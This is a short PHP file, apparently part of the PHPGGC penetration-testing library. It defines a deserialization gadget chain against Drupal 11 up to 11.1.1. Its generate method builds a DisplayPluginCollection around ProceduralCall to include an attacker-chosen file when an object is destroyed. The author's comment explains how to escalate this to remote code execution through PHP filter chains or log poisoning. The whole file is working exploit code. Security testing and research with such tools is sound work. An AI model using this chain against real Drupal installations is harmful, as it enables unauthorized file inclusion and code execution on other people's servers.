<?php

namespace GadgetChain\Drupal11;

class FileInclude1 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '11.*.* <= 11.1.1';
    public static $vector = '__destruct';
    public static $author = 'shin24';
    public static $information = 
    'File inclusion can be escalated to RCE by using php filter chain, but in newer version of php the filter chain depth is limited. Still, log file poisoning and other technique can be used as well. I haven\'t tested on other drupal version so it might work on drupal 7 and 9 as well';

    public function generate(array $parameters)
    {
        $remote_path = $parameters['remote_path'];
        return new \Drupal\views\DisplayPluginCollection(
            array(new \Drupal\Core\Extension\ProceduralCall(
                $remote_path
            ))
        );
    }
}